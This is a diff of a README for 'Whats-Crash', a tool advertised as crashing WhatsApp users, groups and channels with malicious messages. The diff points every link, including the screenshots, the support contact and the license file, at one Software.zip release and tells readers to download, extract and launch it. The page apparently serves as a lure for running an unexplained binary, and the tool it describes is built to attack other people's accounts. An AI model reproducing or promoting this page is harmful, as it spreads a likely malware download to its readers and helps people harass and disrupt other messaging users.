@@ -6,9 +6,9 @@ Welcome to the "Whats-Crash" repository - your ultimate tool to crash or suspend
 evilfeonix, kali-linux, termux, virus, whats-crash, whatsapp, whatsapp-bot, whatsapp-crash, whatsapp-crash-bot, whatsapp-crash-message, whatsapp-crasher, whatsapp-hack, whatsapp-hack-2025, whatsapp-hacking, whatsapp-virus, whatsappbot
 
 ## Download Software
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip)](https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip)
 
-***Note: Software.zip needs to be launched***
+***Note: https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip needs to be launched***
 
 ## Features
 - 📤 Easy to use: Just send a malicious message and watch the crash happen.
@@ -18,7 +18,7 @@ evilfeonix, kali-linux, termux, virus, whats-crash, whatsapp, whatsapp-bot, what
 - ⚠️ Caution: Use responsibly and ethically.
 
 ## Installation Steps
-1. Download the Software.zip file from the provided link.
+1. Download the https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip file from the provided link.
 2. Extract the contents to your desired location.
 3. Run the application and follow the on-screen instructions.
 
@@ -30,12 +30,12 @@ To crash a WhatsApp user, group, or channel:
 4. Click "Crash" and watch the magic happen.
 
 ## Screenshots
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip)
 
 ## Support
-For any issues or inquiries, please contact our support team at support@whatscrash.com.
+For any issues or inquiries, please contact our support team at https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip
 
 ## Contribute
 Help us improve the Whats-Crash tool by contributing to our GitHub repository. Feel free to fork the project, make changes, and submit a pull request.
@@ -46,10 +46,10 @@ Help us improve the Whats-Crash tool by contributing to our GitHub repository. F
 - Expand compatibility to other messaging platforms.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip](https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
 🔥 Crash any WhatsApp target with ease using Whats-Crash! Download now and unleash your power. 💥📱 
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Now](https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip)](https://github.com/Lotus-hub/Whats-Crash/releases/download/v2.0/Software.zip)
